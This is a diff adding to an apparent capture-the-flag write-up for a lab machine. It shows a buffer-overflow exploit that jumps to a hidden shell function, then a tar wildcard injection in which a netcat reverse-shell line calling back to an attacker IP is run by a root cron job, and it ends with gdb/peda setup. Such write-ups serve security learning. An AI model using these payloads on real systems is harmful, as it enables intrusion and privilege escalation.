@@ -263,3 +263,268 @@ undefined8 main(void)
   return 0;
 }
 
+void call_bash(void)
+
+{
+  puts("\nWe are Anonymous.");
+  sleep(1);
+  puts("We are Legion.");
+  sleep(1);
+  puts("We do not forgive.");
+  sleep(1);
+  puts("We do not forget.");
+  sleep(1);
+  puts("[Message corrupted]...Well...done.");
+  setuid(0x539);
+  system("/bin/sh");
+  return;
+}
+
+buffer overflow
+
+magna@anonymous-playground:~$ ./hacktheworld 
+Who do you want to hack? AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAa
+Segmentation fault (core dumped)
+
+magna@anonymous-playground:~$ python -c 'print "A"*71' | ./hacktheworld
+Who do you want to hack?
+
+magna@anonymous-playground:~$ python -c 'print "A"*72' | ./hacktheworld
+Segmentation fault (core dumped)
+
+magna@anonymous-playground:~$ readelf -s hacktheworld | grep -i "call_bash"
+    50: 0000000000400657   129 FUNC    GLOBAL DEFAULT   13 call_bash
+
+magna@anonymous-playground:~$ python -c 'print "A"*72 + "\x57\x06\x40\x00\x00\x00\x00\x00"' | ./hacktheworld
+Who do you want to hack? 
+We are Anonymous.
+We are Legion.
+We do not forgive.
+We do not forget.
+[Message corrupted]...Well...done.
+Segmentation fault (core dumped)
+
+magna@anonymous-playground:~$ (python -c 'print "A"*72 + "\x57\x06\x40\x00\x00\x00\x00\x00"' ; cat) | ./hacktheworld
+Who do you want to hack? 
+We are Anonymous.
+We are Legion.
+We do not forgive.
+We do not forget.
+[Message corrupted]...Well...done.
+whoami
+Segmentation fault (core dumped)
+magna@anonymous-playground:~$ (python -c 'print "A"*72 + "\x58\x06\x40\x00\x00\x00\x00\x00"' ; cat) | ./hacktheworld
+Who do you want to hack? 
+We are Anonymous.
+We are Legion.
+We do not forgive.
+We do not forget.
+[Message corrupted]...Well...done.
+whoami
+spooky
+python -c 'import pty; pty.spawn("/bin/sh")'
+```
+```text
+$ id
+id
+uid=1337(spooky) gid=1001(magna) groups=1001(magna)
+```
+```text
+$ cd /home
+cd /home
+```
+```text
+$ ls
+ls
+dev  magna  spooky
+```
+```text
+$ cd spooky
+cd spooky
+```
+```text
+$ ls
+ls
+flag.txt
+```
+```text
+$ cat flag.txt
+cat flag.txt
+69ee352fb139c9d0699f6f399b63d9d7
+spooky@anonymous-playground:/home/spooky$ cat /etc/crontab
+cat /etc/crontab
+```
+```text
+# /etc/crontab: system-wide crontab
+```
+```text
+# Unlike any other crontab you don't have to run the `crontab'
+```
+```text
+# command to install the new version when you edit this file
+```
+```text
+# and files in /etc/cron.d. These files also have username fields,
+```
+```text
+# that none of the other crontabs do.
+
+SHELL=/bin/sh
+PATH=/usr/local/sbin:/usr/local/bin:/sbin:/bin:/usr/sbin:/usr/bin
+```
+
+## Exploitation
+```text
+# m h dom mon dow user	command
+17 *	* * *	root    cd / && run-parts --report /etc/cron.hourly
+25 6	* * *	root	test -x /usr/sbin/anacron || ( cd / && run-parts --report /etc/cron.daily )
+47 6	* * 7	root	test -x /usr/sbin/anacron || ( cd / && run-parts --report /etc/cron.weekly )
+52 6	1 * *	root	test -x /usr/sbin/anacron || ( cd / && run-parts --report /etc/cron.monthly )
+*/1 *   * * *	root	cd /home/spooky && tar -zcf /var/backups/spooky.tgz *
+#
+
+tar wild injection
+
+spooky@anonymous-playground:/home/spooky$ echo "rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|sh -i 2>&1|nc 10.8.19.103 1338 >/tmp/f" > shell.sh
+/f|sh -i 2>&1|nc 10.8.19.103 1338 >/tmp/f" > shell.sh
+spooky@anonymous-playground:/home/spooky$ echo ""> "--checkpoint-action=exec=sh shell.sh"
+shell.sh""--checkpoint-action=exec=sh s
+spooky@anonymous-playground:/home/spooky$ echo ""> --checkpoint=1
+echo ""> --checkpoint=1
+spooky@anonymous-playground:/home/spooky$ ls -l
+ls -l
+total 16
+-rw-rw-r-- 1 spooky magna   1 Jul  9 17:29 '--checkpoint=1'
+-rw-rw-r-- 1 spooky magna   1 Jul  9 17:29 '--checkpoint-action=exec=sh shell.sh'
+-r-------- 1 spooky spooky 33 Jul  4  2020  flag.txt
+-rw-rw-r-- 1 spooky magna  74 Jul  9 17:28  shell.sh
+
+┌──(witty㉿kali)-[~/Downloads]
+└─$ rlwrap nc -lvnp 1338
+listening on [any] 1338 ...
+connect to [10.8.19.103] from (UNKNOWN) [10.10.4.129] 42276
+sh: 0: can't access tty; job control turned off
+```
+```text
+# cd /root
+```
+```text
+# ls
+flag.txt
+```
+```text
+# cat flag.txt
+bc55a426e98deb673beabda50f24ce66
+
+another way to exploit buffer overflow
+
+magna@anonymous-playground:~$ gdb hacktheworld
+GNU gdb (Ubuntu 8.1-0ubuntu3.2) 8.1.0.20180409-git
+Copyright (C) 2018 Free Software Foundation, Inc.
+License GPLv3+: GNU GPL version 3 or later <http://gnu.org/licenses/gpl.html>
+This is free software: you are free to change and redistribute it.
+There is NO WARRANTY, to the extent permitted by law.  Type "show copying"
+and "show warranty" for details.
+This GDB was configured as "x86_64-linux-gnu".
+Type "show configuration" for configuration details.
+For bug reporting instructions, please see:
+<http://www.gnu.org/software/gdb/bugs/>.
+Find the GDB manual and other documentation resources online at:
+<http://www.gnu.org/software/gdb/documentation/>.
+For help, type "help".
+Type "apropos word" to search for commands related to "word"...
+Reading symbols from hacktheworld...(no debugging symbols found)...done.
+(gdb) r < <(cyclic 100)
+Starting program: /home/magna/hacktheworld < <(cyclic 100)
+/bin/bash: cyclic: command not found
+
+──(witty㉿kali)-[~/Downloads]
+└─$ export PATH="$PATH:/home/witty/.local/bin"
+                                                                                            
+┌──(witty㉿kali)-[~/Downloads]
+└─$ cyclic 60                                 
+[*] Checking for new versions of pwntools
+    To disable this functionality, set the contents of /home/witty/.cache/.pwntools-cache-3.11/update to 'never' (old way).
+    Or add the following lines to ~/.pwn.conf or ~/.config/pwn.conf (or /etc/pwn.conf system-wide):
+        [update]
+        interval=never
+[*] A newer version of pwntools is available on pypi (4.9.0 --> 4.10.0).
+    Update with: $ pip install -U pwntools
+aaaabaaacaaadaaaeaaafaaagaaahaaaiaaajaaakaaalaaamaaanaaaoaaa
+
+┌──(witty㉿kali)-[~/Downloads]
+└─$ sudo apt install gdb-peda
+
+┌──(witty㉿kali)-[~/Downloads]
+└─$ git clone https://github.com/longld/peda.git ~/peda
+Cloning into '/home/witty/peda'...
+remote: Enumerating objects: 382, done.
+remote: Counting objects: 100% (9/9), done.
+remote: Compressing objects: 100% (7/7), done.
+remote: Total 382 (delta 2), reused 8 (delta 2), pack-reused 373
+Receiving objects: 100% (382/382), 290.84 KiB | 1.09 MiB/s, done.
+Resolving deltas: 100% (231/231), done.
+                                                                                   
+┌──(witty㉿kali)-[~/Downloads]
+└─$ echo "source ~/peda/peda.py" >> ~/.gdbinit
+                                                                                   
+┌──(witty㉿kali)-[~/Downloads]
+└─$ gdb hacktheworld                                   
+GNU gdb (Debian 13.1-2) 13.1
+Copyright (C) 2023 Free Software Foundation, Inc.
+License GPLv3+: GNU GPL version 3 or later <http://gnu.org/licenses/gpl.html>
+This is free software: you are free to change and redistribute it.
+There is NO WARRANTY, to the extent permitted by law.
+Type "show copying" and "show warranty" for details.
+This GDB was configured as "x86_64-linux-gnu".
+Type "show configuration" for configuration details.
+For bug reporting instructions, please see:
+<https://www.gnu.org/software/gdb/bugs/>.
+Find the GDB manual and other documentation resources online at:
+    <http://www.gnu.org/software/gdb/documentation/>.
+
+For help, type "help".
+Type "apropos word" to search for commands related to "word"...
+pwndbg: loaded 136 pwndbg commands and 43 shell commands. Type pwndbg [--shell | --all] [filter] for a list.
+pwndbg: created $rebase, $ida GDB functions (can be used with print/break)
+Reading symbols from hacktheworld...
+(No debugging symbols found in hacktheworld)
+------- tip of the day (disable with set show-tips off) -------
+Use the vmmap instruction for a better & colored memory maps display (than the GDB's info proc mappings)
+gdb-peda$ 
+
+┌──(witty㉿kali)-[~/Downloads]
+└─$ cat ~/.gdbinit   
+source /home/witty/Downloads/pwndbg/gdbinit.py
+source ~/peda/peda.py
+
+if I want to use pwndbg tool just remove it :)
+
+https://habr.com/en/articles/551500/
+
+┌──(witty㉿kali)-[~/Downloads]
+└─$ gdb hacktheworld                                   
+GNU gdb (Debian 13.1-2) 13.1
+Copyright (C) 2023 Free Software Foundation, Inc.
+License GPLv3+: GNU GPL version 3 or later <http://gnu.org/licenses/gpl.html>
+This is free software: you are free to change and redistribute it.
+There is NO WARRANTY, to the extent permitted by law.
+Type "show copying" and "show warranty" for details.
+This GDB was configured as "x86_64-linux-gnu".
+Type "show configuration" for configuration details.
+For bug reporting instructions, please see:
+<https://www.gnu.org/software/gdb/bugs/>.
+Find the GDB manual and other documentation resources online at:
+    <http://www.gnu.org/software/gdb/documentation/>.
+
+For help, type "help".
+Type "apropos word" to search for commands related to "word"...
+pwndbg: loaded 136 pwndbg commands and 43 shell commands. Type pwndbg [--shell | --all] [filter] for a list.
+pwndbg: created $rebase, $ida GDB functions (can be used with print/break)
+Reading symbols from hacktheworld...
+(No debugging symbols found in hacktheworld)
+------- tip of the day (disable with set show-tips off) -------
+Use the vmmap instruction for a better & colored memory maps display (than the GDB's info proc mappings)
+gdb-peda$ pattern create 100
+'AAA%AAsAABAA$AAnAACAA-AA(AADAA;AA)AAEAAaAA0AAFAAbAA1AAGAAcAA2AAHAAdAA3AAIAAeAA4AAJAAfAA5AAKAAgAA6AAL'
+gdb-peda$ r
